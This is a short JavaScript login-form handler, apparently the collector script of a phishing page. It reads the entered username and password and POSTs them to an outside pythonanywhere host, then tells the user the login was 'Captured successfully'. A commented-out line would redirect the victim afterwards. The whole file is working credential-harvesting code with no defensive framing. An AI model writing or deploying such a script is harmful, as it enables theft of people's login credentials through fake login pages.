document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();
  
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
  
    fetch("https://edwinomg2010.pythonanywhere.com/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ username, password })
    })
      .then(res => res.text())
      .then(data => {
        alert("✅ Login submitted!\nCaptured successfully.");
        // Optional: redirect after success
        // window.location.href = "https://example.com";
      })
      .catch(err => {
        alert("❌ Error sending data. Try again.");
        console.error(err);
      });
  });
  